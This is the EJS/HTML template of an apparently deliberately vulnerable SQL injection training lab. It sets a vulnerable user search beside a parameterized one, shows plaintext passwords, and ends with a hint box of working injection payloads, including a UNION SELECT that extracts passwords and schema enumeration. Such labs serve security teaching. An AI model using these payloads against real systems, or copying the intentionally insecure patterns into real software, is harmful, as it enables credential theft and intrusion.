<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Search - SQL Injection Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #F2EFEB;
        }
        .container {
            background: #FFFFFF;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(48, 44, 42, 0.1);
        }
        .search-form {
            background-color: #F2EFEB;
            border: 1px solid #918B83;
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .search-form input {
            width: 300px;
            padding: 8px;
            border: 1px solid #918B83;
            border-radius: 4px;
            margin-right: 10px;
        }
        .search-form button {
            background-color: #3C1053;
            color: #FFFFFF;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .search-form button:hover {
            background-color: #B51825;
        }
        .safe-button {
            background-color: #F2120C;
        }
        .safe-button:hover {
            background-color: #B51825;
        }
        .results-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .results-table th,
        .results-table td {
            border: 1px solid #918B83;
            padding: 8px;
            text-align: left;
        }
        .results-table th {
            background-color: #F2EFEB;
            font-weight: bold;
        }
        .query-info {
            background-color: #F2EFEB;
            border: 1px solid #918B83;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .query-info pre {
            background-color: #FFFFFF;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
            font-size: 12px;
            border: 1px solid #918B83;
        }
        .nav-links {
            margin-bottom: 20px;
        }
        .nav-links a {
            color: #3C1053;
            text-decoration: none;
            margin-right: 15px;
        }
        .nav-links a:hover {
            color: #B51825;
            text-decoration: underline;
        }
        .alert {
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
            background-color: #F2EFEB;
            color: #F2120C;
            border: 1px solid #F2120C;
        }
        .hint-box {
            background-color: #F2EFEB;
            border: 1px solid #918B83;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 User Search - SQL Injection Lab</h1>
        
        <div class="nav-links">
            <a href="/">Login</a>
            <a href="/search">Search Users (Vulnerable)</a>
            <a href="/safe-search">Search Users (Safe)</a>
            <a href="/schema">Database Schema</a>
        </div>

        <div class="search-form">
            <h3>Vulnerable Search (SQL Injection)</h3>
            <form method="GET" action="/search">
                <input type="text" name="q" placeholder="Search users..." value="<%= searchTerm || '' %>">
                <button type="submit">Search (Vulnerable)</button>
            </form>
        </div>

        <div class="search-form">
            <h3>Safe Search (Parameterized Queries)</h3>
            <form method="GET" action="/safe-search">
                <input type="text" name="q" placeholder="Search users..." value="<%= searchTerm || '' %>">
                <button type="submit" class="safe-button">Search (Safe)</button>
            </form>
        </div>

        <% if (error) { %>
            <div class="alert">
                <strong>Error:</strong> <%= error %>
            </div>
        <% } %>

        <% if (query) { %>
            <div class="query-info">
                <h3>Executed SQL Query:</h3>
                <pre><%= query %></pre>
                <p><em>This shows the exact SQL query that was executed against the database.</em></p>
            </div>
        <% } %>

        <% if (users && users.length > 0) { %>
            <h3>Search Results (<%= users.length %> found):</h3>
            <table class="results-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Email</th>
                        <th>Role</th>
                        <th>Password</th>
                    </tr>
                </thead>
                <tbody>
                    <% users.forEach(user => { %>
                        <tr>
                            <td><%= user.id %></td>
                            <td><%= user.username %></td>
                            <td><%= user.email %></td>
                            <td><%= user.role %></td>
                            <td><%= user.password %></td>
                        </tr>
                    <% }); %>
                </tbody>
            </table>
        <% } else if (searchTerm) { %>
            <p>No users found for search term: "<%= searchTerm %>"</p>
        <% } %>

        <div class="hint-box">
            <h3>💡 SQL Injection Search Hints:</h3>
            <p>Try these payloads in the vulnerable search form:</p>
            <ul>
                <li><strong>Extract all users:</strong> <code>' OR '1'='1</code></li>
                <li><strong>Union attack:</strong> <code>' UNION SELECT id,username,email,role,password FROM users --</code></li>
                <li><strong>Extract admin users:</strong> <code>' OR role='admin' --</code></li>
                <li><strong>Extract specific user:</strong> <code>' OR username='admin' --</code></li>
                <li><strong>Database schema:</strong> <code>' UNION SELECT name,name,name,name,name FROM sqlite_master WHERE type='table' --</code></li>
            </ul>
        </div>
    </div>
</body>
</html>
